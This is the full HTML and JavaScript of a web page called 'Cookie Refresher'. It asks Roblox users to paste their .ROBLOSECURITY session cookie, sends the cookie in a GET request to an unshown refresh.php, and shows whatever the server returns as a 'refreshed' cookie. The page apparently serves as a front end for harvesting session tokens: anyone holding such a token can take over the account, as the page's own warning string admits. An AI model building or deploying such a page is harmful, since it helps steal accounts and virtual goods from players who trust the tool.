<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cookie Refresher</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    * { box-sizing: border-box; font-family: "Poppins", sans-serif; }
    html, body {
      margin: 0; padding: 0; width: 100%; height: 100%;
      color: #fff; background: #000; overflow-x: hidden; overflow-y: auto;
    }
    .background-black { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: #000; z-index: -10; }
    canvas#snowCanvas, canvas#shootingStarCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -5; pointer-events: none; }
    body { 
      display: flex; 
      flex-direction: column; 
      align-items: center; 
      justify-content: center; 
      min-height: 100vh; 
      padding: 20px; 
      position: relative; 
      z-index: 10; 
      background: transparent; 
    }
    .back-btn { 
      position: fixed; 
      top: 25px; 
      left: 25px; 
      background: rgba(255, 255, 255, 0.05); 
      border: 2px solid #fff; 
      color: #fff; 
      padding: 12px 24px; 
      border-radius: 18px; 
      cursor: pointer; 
      font-size: 14px; 
      font-weight: 600; 
      text-decoration: none; 
      display: flex; 
      align-items: center; 
      gap: 10px; 
      backdrop-filter: blur(10px); 
      text-transform: uppercase; 
      z-index: 1000; 
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3), 0 0 20px rgba(255, 255, 255, 0.3); 
      transition: all 0.3s ease;
    }
    .back-btn:hover {
      background: #fff;
      color: #000;
      transform: translateX(-5px);
    }
    .header-container {
      text-align: center;
      margin-bottom: 20px;
      width: 100%;
    }
    .shiny-text { 
      background: linear-gradient(to right, #fff 20%, #e0e0e0 40%, #e0e0e0 60%, #fff 80%); 
      background-size: 200% auto; 
      -webkit-background-clip: text; 
      -webkit-text-fill-color: transparent; 
      animation: shine 3s infinite linear; 
      font-weight: 800;
      margin: 0;
      font-size: 36px;
      letter-spacing: 3px;
    }
    @keyframes shine { 
      to { background-position: 200% center; } 
    }
    .hero-content { 
      max-width: 500px; 
      width: 100%; 
      background: radial-gradient(circle at top, #0b0f1a, #000); 
      border-radius: 24px; 
      padding: 30px; 
      border: 3px solid #fff; 
      box-shadow: 0 0 30px rgba(255,255,255,0.1); 
      text-align: center; 
      backdrop-filter: blur(10px); 
      animation: glow 3s infinite alternate; 
    }
    @keyframes glow { 
      0% { box-shadow: 0 0 10px #fff, 0 0 20px rgba(255,255,255,0.2); } 
      100% { box-shadow: 0 0 20px #fff, 0 0 40px rgba(255,255,255,0.6); } 
    }
    .input { 
      width: 100%; 
      padding: 15px 20px; 
      border-radius: 12px; 
      background: rgba(255, 255, 255, 0.05); 
      border: 1px solid rgba(255, 255, 255, 0.2); 
      color: #fff; 
      margin-bottom: 1rem; 
      font-size: 16px; 
      transition: all 0.3s ease;
    }
    .input:focus {
      outline: none;
      border-color: #fff;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.4);
    }
    .input::placeholder {
      color: rgba(255, 255, 255, 0.5);
    }
    .hero-btn { 
      background: #fff; 
      color: #000; 
      padding: 1rem; 
      border: none; 
      border-radius: 12px; 
      font-size: 16px; 
      font-weight: 700; 
      cursor: pointer; 
      width: 100%; 
      box-shadow: 0 4px 15px rgba(255, 255, 255, 0.2); 
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    .hero-btn:hover {
      background: #f3f3f3;
      transform: scale(1.02);
    }
    .hero-btn:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }
    
    /* Cookie Tool Heading */
    .tool-heading {
      text-align: center;
      margin-bottom: 20px;
    }
    .tool-title {
      font-size: 24px;
      font-weight: 700;
      color: #fff;
      margin-bottom: 8px;
    }
    .tool-subtitle {
      color: rgba(255, 255, 255, 0.6);
      font-size: 14px;
    }
    
    /* Custom SweetAlert Styles */
    .swal2-popup {
      background: #000 !important;
      border: 2px solid #fff !important;
      border-radius: 20px !important;
      color: #fff !important;
    }
    .swal2-title {
      color: #fff !important;
      font-size: 24px !important;
      font-weight: 700 !important;
    }
    .swal2-html-container {
      color: rgba(255, 255, 255, 0.8) !important;
    }
    .cookie-display-box {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 12px;
      padding: 15px;
      margin: 20px 0;
      word-break: break-all;
      font-family: monospace;
      font-size: 12px;
      max-height: 200px;
      overflow-y: auto;
      text-align: left;
      color: #fff;
    }
    .swal2-confirm, .swal2-cancel {
      border-radius: 12px !important;
      padding: 12px 24px !important;
      font-weight: 700 !important;
      font-size: 14px !important;
      margin: 5px !important;
    }
    .swal2-confirm {
      background: #fff !important;
      color: #000 !important;
    }
    .swal2-cancel {
      background: rgba(255, 255, 255, 0.1) !important;
      color: #fff !important;
      border: 1px solid rgba(255, 255, 255, 0.3) !important;
    }
    .cookie-label {
      display: flex;
      align-items: center;
      gap: 8px;
      color: #fff;
      font-weight: 600;
      margin-bottom: 10px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="background-black"></div>
  <canvas id="shootingStarCanvas"></canvas>
  <canvas id="snowCanvas"></canvas>

  <a href="tools.html" class="back-btn">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
      <line x1="19" y1="12" x2="5" y2="12"></line>
      <polyline points="12 19 5 12 12 5"></polyline>
    </svg>
    Back
  </a>

  <div class="header-container">
    <h1 class="shiny-text">COOKIE REFRESHER</h1>
    <p style="color: rgba(255,255,255,0.6); margin-top: 10px;">Refresh your Roblox cookies securely</p>
  </div>
  
  <div class="hero-content">
    <!-- Cookie Tool Heading -->
    <div class="tool-heading">
      <div class="tool-title">Cookie Tool</div>
      <div class="tool-subtitle">Paste your .ROBLOSECURITY cookie below</div>
    </div>
    
    <form id="cookieForm">
      <input type="text" id="cookieInput" class="input" name="cookie" placeholder="Paste .ROBLOSECURITY cookie here" required />
      <button type="submit" class="hero-btn" id="refreshBtn">
        <i class="fas fa-sync-alt"></i> REFRESH COOKIES
      </button>
    </form>
  </div>

  <script>
    // Snow Effect
    (function(){
      const canvas = document.getElementById("snowCanvas");
      const ctx = canvas.getContext("2d");
      let width = canvas.width = window.innerWidth;
      let height = canvas.height = window.innerHeight;
      let snowflakes = [];
      const number = 100;
      
      for (let i = 0; i < number; i++){ 
        snowflakes.push({ 
          x: Math.random() * width, 
          y: Math.random() * height, 
          radius: Math.random() * 4 + 1, 
          density: Math.random() * number 
        }); 
      }
      
      let angle = 0;
      
      function drawSnowflakes(){
        ctx.clearRect(0, 0, width, height); 
        ctx.fillStyle = "rgba(255,255,255,0.8)"; 
        ctx.beginPath();
        for (let i = 0; i < number; i++){ 
          let f = snowflakes[i]; 
          ctx.moveTo(f.x, f.y); 
          ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2, true); 
        }
        ctx.fill(); 
        updateSnowflakes();
      }
      
      function updateSnowflakes(){
        angle += 0.005;
        for (let i = 0; i < number; i++){
          let f = snowflakes[i]; 
          f.y += Math.cos(angle + f.density) + 0.5 + f.radius / 4; 
          f.x += Math.sin(angle) * 0.5;
          if (f.x > width + 5 || f.x < -5 || f.y > height) { 
            snowflakes[i] = { 
              x: Math.random() * width, 
              y: -10, 
              radius: f.radius, 
              density: f.density 
            }; 
          }
        }
      }
      
      setInterval(drawSnowflakes, 33);
      window.addEventListener("resize", function(){ 
        width = canvas.width = window.innerWidth; 
        height = canvas.height = window.innerHeight; 
      });
    })();

    // Shooting Stars Effect
    (function(){
      const starCanvas = document.getElementById('shootingStarCanvas');
      const starCtx = starCanvas.getContext('2d');
      let stars = [];
      
      function resizeStars() { 
        starCanvas.width = window.innerWidth; 
        starCanvas.height = window.innerHeight; 
      }
      
      window.addEventListener('resize', resizeStars);
      resizeStars();
      
      class ShootingStar {
        constructor() { 
          this.reset(); 
          this.active = false; 
          setTimeout(() => { this.active = true; }, Math.random() * 10000); 
        }
        
        reset() { 
          this.x = Math.random() * starCanvas.width; 
          this.y = 0; 
          this.len = Math.random() * 80 + 50; 
          this.speed = Math.random() * 10 + 5; 
          this.active = false; 
          this.opacity = Math.random() * 0.3 + 0.7; 
        }
        
        update() { 
          if (!this.active) return; 
          this.x -= this.speed; 
          this.y += this.speed; 
          if (this.x < -this.len || this.y > starCanvas.height + this.len) { 
            this.active = false; 
            setTimeout(() => { 
              this.reset(); 
              setTimeout(() => { this.active = true; }, Math.random() * 5000); 
            }, Math.random() * 3000); 
          } 
        }
        
        draw() { 
          if (!this.active) return; 
          starCtx.strokeStyle = `rgba(255, 255, 255, ${this.opacity})`; 
          starCtx.lineWidth = 2; 
          starCtx.beginPath(); 
          starCtx.moveTo(this.x, this.y); 
          starCtx.lineTo(this.x + this.len, this.y - this.len); 
          starCtx.stroke(); 
        }
      }
      
      for (let i = 0; i < 3; i++) stars.push(new ShootingStar());
      
      function animateStars() { 
        starCtx.clearRect(0, 0, starCanvas.width, starCanvas.height); 
        stars.forEach(s => { s.update(); s.draw(); }); 
        requestAnimationFrame(animateStars); 
      }
      
      animateStars();
    })();

    // Form Submission Handler
    $('#cookieForm').on('submit', function(e) {
      e.preventDefault();
      const cookie = $('#cookieInput').val().trim();
      
      if (!cookie) {
        Swal.fire({
          icon: 'error',
          title: 'Oops...',
          text: 'Please paste a valid .ROBLOSECURITY cookie',
          background: '#000',
          color: '#fff',
          confirmButtonText: 'OK',
          confirmButtonColor: '#fff',
          customClass: {
            confirmButton: 'swal2-confirm'
          }
        });
        return;
      }
      
      const btn = $('#refreshBtn');
      const originalHtml = btn.html();

      btn.prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> REFRESHING...');

      // Submit to refresh.php
      $.ajax({
        url: 'refresh.php',
        method: 'GET',
        data: { cookie: cookie },
        success: function(response) {
          if (response.includes("Invalid Cookie")) {
            Swal.fire({
              icon: 'error',
              title: 'FAILED',
              text: 'Invalid or expired cookie',
              background: '#000',
              color: '#fff',
              confirmButtonText: 'OK',
              confirmButtonColor: '#fff'
            });
          } else {
            const finalCookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + response;
            
            // Show success popup with Copy and Try Another buttons
            Swal.fire({
              title: '✅ SUCCESS!',
              html: `
                <div class="cookie-label">
                  <i class="fas fa-cookie"></i>
                  <span>Refreshed Cookie:</span>
                </div>
                <div class="cookie-display-box">${finalCookie}</div>
                <p style="color: rgba(255,255,255,0.6); font-size: 14px; margin-top: 10px;">Cookie has been successfully refreshed!</p>
              `,
              icon: 'success',
              background: '#000',
              color: '#fff',
              showCancelButton: true,
              confirmButtonText: '<i class="fas fa-copy"></i> Copy',
              cancelButtonText: '<i class="fas fa-redo"></i> Try Another',
              confirmButtonColor: '#fff',
              cancelButtonColor: 'rgba(255,255,255,0.1)',
              reverseButtons: true,
              customClass: {
                popup: 'swal2-popup',
                confirmButton: 'swal2-confirm',
                cancelButton: 'swal2-cancel'
              }
            }).then((result) => {
              if (result.isConfirmed) {
                // Copy to clipboard
                navigator.clipboard.writeText(finalCookie).then(() => {
                  Swal.fire({
                    title: 'Copied!',
                    icon: 'success',
                    toast: true,
                    position: 'top-end',
                    showConfirmButton: false,
                    timer: 1500,
                    background: '#000',
                    color: '#fff'
                  });
                });
              } else if (result.dismiss === Swal.DismissReason.cancel) {
                // Clear form and reset for another cookie
                $('#cookieInput').val('').focus();
              }
            });
          }
        },
        error: function() {
          Swal.fire({
            icon: 'error',
            title: 'ERROR',
            text: 'Something went wrong. Please try again.',
            background: '#000',
            color: '#fff',
            confirmButtonText: 'OK',
            confirmButtonColor: '#fff'
          });
        },
        complete: function() {
          btn.prop('disabled', false).html(originalHtml);
        }
      });
    });

    // Focus on input when page loads
    $(document).ready(function() {
      $('#cookieInput').focus();
    });
  </script>
</body>
</html>